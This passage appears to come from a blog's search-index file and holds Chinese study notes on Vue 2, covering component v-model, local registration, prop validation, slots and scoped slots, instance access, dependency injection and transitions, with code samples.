<h3 id="💥-组件使用-v-model"><a href="#💥-组件使用-v-model" class="headerlink" title="💥 组件使用 v-model"></a>💥 组件使用 <code>v-model</code></h3><blockquote>
<p>🛠 个人理解:<br><code>v-bind</code> 连接的 <code>attribute</code> 并非随意的, 只有在父组件中才可以任意定义, 子组件调用系统规定的一些如：<code>click</code>, 并调用父组件的方法</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;custom-input&#x27;</span>, &#123;</span><br><span class="line">  props: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">  template: <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;input</span></span><br><span class="line"><span class="string">      v-bind:value=&quot;value&quot;</span></span><br><span class="line"><span class="string">      v-on:input=&quot;$emit(&#x27;input&#x27;, $event.target.value)&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">custom-input</span> <span class="attr">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>🛠 注册组件注意点：  </p>
<ul>
<li>将 <code>value</code> attribute 绑定到 <code>value</code> 的 prop上  </li>
<li>将 <code>input</code> 事件值重定义</li>
</ul>
</blockquote>
<p>其实上述的 <code>v-model</code> 等价于:  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;custom-input</span><br><span class="line">  v-bind:value=&quot;searchText&quot;</span><br><span class="line">  v-on:input=&quot;searchText = $event&quot;</span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue 源码分析</title>
    <url>/2021/02/10/vue-original-code/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之组件注册</title>
    <url>/2021/01/24/vue-learn-6/</url>
    <content><![CDATA[<h3 id="🌟-深入探讨组件"><a href="#🌟-深入探讨组件" class="headerlink" title="🌟 深入探讨组件"></a>🌟 深入探讨组件</h3><h4 id="⭐-局部注册初步"><a href="#⭐-局部注册初步" class="headerlink" title="⭐ 局部注册初步"></a>⭐ 局部注册初步</h4><blockquote>
<p>前面探讨的皆是 <code>全局注册</code>, 接下来讨论 <code>局部注册</code>;</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册局部组件</span></span><br><span class="line"><span class="keyword">var</span> ComponentA = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="keyword">var</span> ComponentB = &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="keyword">var</span> ComponentC = &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  components: &#123;</span><br><span class="line">    <span class="string">&#x27;component-a&#x27;</span>: ComponentA,</span><br><span class="line">    <span class="string">&#x27;component-b&#x27;</span>: ComponentB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🐞 局部注册的组件在子组件中不可用！</p>
<p>要想在 <code>ComponentB</code> 中使用 <code>ComponentA</code>:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ComponentA = &#123; <span class="comment">/*...*/</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ComponentB = &#123;</span><br><span class="line">    components: &#123;</span><br><span class="line">        <span class="string">&#x27;component-a&#x27;</span>: ComponentA</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="⭐-单向数据流"><a href="#⭐-单向数据流" class="headerlink" title="⭐ 单向数据流"></a>⭐ 单向数据流</h4><blockquote>
<p>单向下行绑定: 父级 <code>prop</code> 的<strong>更新</strong>会向下流动到子组件, 但是反过来不行</p>
</blockquote>
<p>🌀 变更 <code>prop</code> 的常见情形:</p>
<ul>
<li>这个 <code>prop </code> 用来传递一个初始值; 这个子组件接下来希望将其作为一个本地的 <code>prop</code> 数据来使用:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">props: [<span class="string">&#x27;initialCounter&#x27;</span>],</span><br><span class="line">data: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    counter: <span class="built_in">this</span>.initialCounter</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>这个 <code>prop</code> 以一种原始的值传入且需要进行转换:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">props: [<span class="string">&#x27;size&#x27;</span>],</span><br><span class="line">computed: &#123;</span><br><span class="line">  normalizedSize: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.size.trim().toLowerCase()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="⭐-Prop-验证"><a href="#⭐-Prop-验证" class="headerlink" title="⭐ Prop 验证"></a>⭐ <code>Prop</code> 验证</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;my-component&#x27;</span>, &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    <span class="comment">// null 和 undefined 会通过任何类型验证</span></span><br><span class="line">    propA: <span class="built_in">Number</span>,</span><br><span class="line">    <span class="comment">// 多个类型</span></span><br><span class="line">    propB: [<span class="built_in">String</span>, <span class="built_in">Number</span>],  </span><br><span class="line">    <span class="comment">// 必填</span></span><br><span class="line">    propC: &#123;<span class="attr">type</span>: <span class="built_in">String</span>, <span class="attr">required</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    <span class="comment">// 带有默认值</span></span><br><span class="line">    propD: &#123;<span class="attr">type</span>: <span class="built_in">String</span>, <span class="attr">default</span>: <span class="number">100</span>&#125;,</span><br><span class="line">    <span class="comment">// 对象或数组默认值必须从一个工厂函数获取</span></span><br><span class="line">    propE: &#123;<span class="attr">type</span>: <span class="built_in">Object</span>, <span class="attr">default</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;<span class="attr">message</span>: <span class="string">&#x27;hello&#x27;</span>&#125;</span><br><span class="line">    &#125;&#125;,</span><br><span class="line">    <span class="comment">// 自定义验证函数</span></span><br><span class="line">    propF: &#123;<span class="attr">validator</span>: <span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;warning&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>].indexOf(value) != -<span class="number">1</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>当 <code>prop</code> 验证失败时, Vue 将会产生一个控制台的警告;</li>
<li><code>type</code> 可以是 <code>String</code> <code>Number</code> <code>Boolean</code> <code>Array</code> <code>Object</code> <code>Date</code> <code>Function</code> <code>Symbol</code>;</li>
<li><code>type</code> 也可以是自定义构造函数</li>
</ul>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">firstName, lastName</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.firstName = firstName</span><br><span class="line">  <span class="built_in">this</span>.lastName = lastName</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;blog-post&#x27;</span>, &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    author: Person</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 - Vue 之插槽</title>
    <url>/2021/01/25/vue-learn-7/</url>
    <content><![CDATA[<h3 id="💥-插槽"><a href="#💥-插槽" class="headerlink" title="💥 插槽"></a>💥 插槽</h3><blockquote>
<p><code>&lt;slot&gt;&lt;/slot&gt;</code> 作为内容出口, 插槽可包括: 内容文字、代码、其他组件<br>或许自定义组件中这样写:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">  v-bind:href=&quot;url&quot;</span><br><span class="line">  class=&quot;nav-link&quot;</span><br><span class="line">&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigation-link</span> <span class="attr">url</span>=<span class="string">&quot;/profile&quot;</span>&gt;</span></span><br><span class="line">  这里的内容可替代上文的插槽 <span class="emoji" alias="smile" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">&#x1f604;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation-link</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里可以: <code>&lt;slot&gt;something&lt;/slot&gt;</code> ; 这样的话如果 <code>&lt;navigation-link&gt;&lt;/navigation-link&gt;</code> 不填内容, 则默认是 <code>something</code> , 如果填内容, 则代替 <code>something</code>;</p>
</blockquote>
<h4 id="🌟-编译作用域"><a href="#🌟-编译作用域" class="headerlink" title="🌟 编译作用域"></a>🌟 编译作用域</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigation-link</span> <span class="attr">url</span>=<span class="string">&quot;/profile&quot;</span>&gt;</span></span><br><span class="line">  Logged in as &#123;&#123; user.name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation-link</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>相同点: 可以访问实例, 也就是 <code>new Vue</code> 定义的作用域;</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">navigation-link url=&quot;/profile&quot;&gt;</span><br><span class="line">  Clicking here will send you to: &#123;&#123; url &#125;&#125;</span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  这里的 `url` 会是 undefined，因为其 (指该插槽的) 内容是</span></span><br><span class="line"><span class="comment">  _传递给_ &lt;navigation-link&gt; 的而不是</span></span><br><span class="line"><span class="comment">  在 &lt;navigation-link&gt; 组件*内部*定义的。</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation-link</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>但是不可以访问 <code>&lt;navigation-link&gt;</code> 的作用域</li>
<li>⭐ 总结: 父级模板里的所有内容都是在父级作用域中编译的; 子模板里的所有内容都是在子作用域中编译的</li>
</ul>
</blockquote>
<h4 id="🌟-多个插槽-—-具名插槽"><a href="#🌟-多个插槽-—-具名插槽" class="headerlink" title="🌟 多个插槽 — 具名插槽"></a>🌟 多个插槽 — 具名插槽</h4><blockquote>
<p>在自定义组件的 <code>&lt;slot&gt;</code> 引入 <code>name</code> : <code>&lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt;</code>, 在实际使用组件时: 在一个 <code>&lt;template&gt;</code> 元素上使用 <code>v-slot</code> 指令, 并以 <code>v-slot</code> 的参数的形式提供其名称: <code>&lt;template v-slot:header&gt;...&lt;/template&gt;</code> , 用这个代替相应插槽内容</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- base-layout --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;header&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;footer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Here might be a page title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>&gt;</span> <span class="comment">&lt;!-- 去掉无影响 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>A paragraph for the main content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>And another one.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span> <span class="comment">&lt;!-- 去掉无影响 --&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Here&#x27;s some contact info<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">base-layout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>🌀 缩写: <code>v-slot:</code> 可以替换为字符 <code>#</code>, 即 <code>v-slot:header</code> 重写为: <code>#header</code></p>
</blockquote>
<h4 id="🌟-作用域插槽"><a href="#🌟-作用域插槽" class="headerlink" title="🌟 作用域插槽"></a>🌟 作用域插槽</h4><blockquote>
<p>有模板 <code>&lt;current-user&gt;&lt;/current-user&gt;</code> 如下:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span>&#123;&#123; user.lastName &#125;&#125;<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>换掉备用内容, 显示如下:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span>&gt;</span> &#123;&#123; user.firstName &#125;&#125; <span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>⭐ 不显示 ？因为只有 <code>&lt;current-user&gt;</code> 可以访问到 <code>user</code>, 就是说只有 <code>&lt;current-user v-bind:user=&quot;user&quot;&gt;</code> 这样才可以访问 <code>user</code>;<br>问题: 如何不在父组件上绑定——也能实现可用?</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 升级版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">v-bind:user</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; user.lastName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>显示如下:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; slotProps.user.firstName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><p>包含所有 <code>插槽 prop</code> 的对象命名为 <code>slotProps</code></p>
</li>
<li><p>可以缩写为: <code>&lt;template v-slot=&quot;slotProps&quot;&gt;</code></p>
</li>
<li><p><code>v-slot</code> 可以缩写为 <code>#</code>, <strong>但是</strong>只有在其有参数才可以缩写, 像 <code>v-slot=&quot;user&quot;</code> 不能写成: <code>#=&quot;user&quot;</code></p>
</li>
<li><p>默认插槽的缩写语法不可和具名插槽混用</p>
</li>
<li><p>出现多个插槽, 且要使用这种语法, 就使用完整的基于 <code>&lt;template&gt;</code> 的语法, 像这样: </p>
</li>
</ul>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123; slotProps.user.firstName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:other</span>=<span class="string">&quot;otherSlotProps&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>而不能这样:</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span> <span class="attr">v-slot</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; slotProps.user.firstName &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:other</span>=<span class="string">&quot;otherSlotProps&quot;</span>&gt;</span></span><br><span class="line">    slotProps is NOT available here</span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="🌟-解构插槽-Prop"><a href="#🌟-解构插槽-Prop" class="headerlink" title="🌟 解构插槽 Prop"></a>🌟 解构插槽 <code>Prop</code></h4><p><span class="emoji" alias="v" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/270c.png?v8">&#x270c;</span></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123;user&#125;&quot;</span>&gt;</span>&#123;&#123; user.firstName &#125;&#125;<span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="v" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/270c.png?v8">&#x270c;</span> <code>prop</code> 重命名:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; user: person &#125;&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; person.firstName &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><span class="emoji" alias="v" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/270c.png?v8">&#x270c;</span> 定义备用内容:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">current-user</span> <span class="attr">v-slot</span>=<span class="string">&quot;&#123; user = &#123; firstName: &#x27;Guest&#x27; &#125; &#125;&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123; user.firstName &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">current-user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>初识 - Vue 之边界处理</title>
    <url>/2021/01/26/vue-learn-8/</url>
    <content><![CDATA[<h3 id="x2600-处理边界情况"><a href="#x2600-处理边界情况" class="headerlink" title="&#x2600; 处理边界情况"></a><span class="emoji" alias="sunny" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2600.png?v8">&#x2600;</span> 处理边界情况</h3><blockquote>
<p>⭐ 访问根实例: <code>this.$root</code> </p>
<blockquote>
<p>所有子组件都可以将这个实例 <code>new Vue</code> 作为一个全局 store 来访问或使用:</p>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$root.certain-data;    <span class="comment">// 访问 data 中的值</span></span><br><span class="line"><span class="built_in">this</span>.$root.certain-data = certain-num;  <span class="comment">// 更改</span></span><br><span class="line"><span class="built_in">this</span>.$root.certain-method() <span class="comment">// 调用 method 中方法</span></span><br><span class="line"><span class="built_in">this</span>.$root.computed-num;    <span class="comment">//访问计算属性</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>⭐ 访问父级组件实例: <code>this.$parent</code>  </p>
<blockquote>
<p>此处后续再叙述……</p>
</blockquote>
</blockquote>
<blockquote>
<p>⭐ 访问子组件实例或子元素: <code>this.$refs</code></p>
<blockquote>
</blockquote>
<p>这里通过 <code>ref</code> 这个 attribute 为子组件赋予一个 ID 引用;</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base-input</span> <span class="attr">ref</span>=<span class="string">&quot;usernameInput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">base-input</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>现在可以使用 <code>this.$refs.usernameInput</code> 来访问 <code>&lt;base-input&gt;</code> 这个实例</p>
<blockquote>
</blockquote>
<p>具体后续再进行补充……</p>
</blockquote>
<blockquote>
<p>⭐ 依赖注入</p>
<blockquote>
</blockquote>
<p>使用两个新的实例选项: <code>provide</code> 和 <code>inject</code></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">google-map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">google-map-region</span> <span class="attr">v-bind:shape</span>=<span class="string">&quot;cityBoundaries&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">google-map-markers</span> <span class="attr">v-bind:places</span>=<span class="string">&quot;iceCreamShops&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">google-map-markers</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">google-map-region</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">google-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>provide</code> 选项允许指定想要提供给厚点组件的数据/方法, 如：<code>&lt;google-map&gt;</code> 内部的 <code>getMap</code> 方法:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">provide: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        getMap: <span class="built_in">this</span>.getMap</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后在任何后代组件中, 可以使用 <code>inject</code> 选项来接收指定的我们想要添加在这个实例上的 <code>property</code>:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">inject: [<span class="string">&#x27;getMap&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="x2600-进入-离开-amp-列表过渡"><a href="#x2600-进入-离开-amp-列表过渡" class="headerlink" title="&#x2600; 进入/离开 &amp; 列表过渡"></a><span class="emoji" alias="sunny" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2600.png?v8">&#x2600;</span> 进入/离开 &amp; 列表过渡</h3><h4 id="🌟-单元素-组件的过渡"><a href="#🌟-单元素-组件的过渡" class="headerlink" title="🌟 单元素/组件的过渡"></a>🌟 单元素/组件的过渡</h4><p>[详细请参考]<a href="https://cn.vuejs.org/v2/guide/transitions.html">(</a>)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show = !show&quot;</span>&gt;</span></span><br><span class="line">    Toggle</span><br><span class="line">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;fade&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;show&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">```js</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#x27;#demo&#x27;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    show: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter-active</span>, <span class="selector-class">.fade-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: opacity .<span class="number">5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.fade-enter</span>, <span class="selector-class">.fade-leave-to</span> <span class="comment">/* .fade-leave-active below version 2.1.8 */</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>自动嗅探目标元素是否应用 css 过渡或动画, 如果是, 在恰当时机添加/删除 css 类名;<blockquote>
</blockquote>
</li>
<li>如果过渡组件提供了 JavaScript 钩子函数, 这些钩子函数将在恰当的时机被调用;<blockquote>
</blockquote>
</li>
<li>如果没找到 JavaScript 钩子并且也没有检测到 css 过渡/动画, DOM 操作(插入/删除)在下一帧中立即执行;</li>
</ul>
</blockquote>
<blockquote>
<p>在进入/离开的过渡中, 会有6个 class 切换:<br><code>v-entere</code>  <code>v-enter-active</code>  <code>v-enter-to</code>  <code>v-leave</code>  <code>v-leave-active</code>  <code>v-leave-to</code></p>
</blockquote>
<blockquote>
<p>🐞 <code>v-</code> 是类名的默认前缀, 如果使用: <code>&lt;trantion name=&#39;my-transition&#39;&gt;</code> 则 <code>v-enter</code> 替换为 <code>my-transition-enter</code>  </p>
</blockquote>
<h4 id="🌟-CSS-的过渡"><a href="#🌟-CSS-的过渡" class="headerlink" title="🌟 CSS 的过渡"></a>🌟 <code>CSS</code> 的过渡</h4><h4 id="🌟-CSS-动画"><a href="#🌟-CSS-动画" class="headerlink" title="🌟 CSS 动画"></a>🌟 <code>CSS</code> 动画</h4><h4 id="🌟-显性的过渡持续时间"><a href="#🌟-显性的过渡持续时间" class="headerlink" title="🌟 显性的过渡持续时间"></a>🌟 显性的过渡持续时间</h4><blockquote>
<p>可以用 <code>&lt;transition&gt;</code> 组件上的 <code>duration</code> prop 定制一个显性的过渡持续时间( ms 计):</p>
</blockquote>
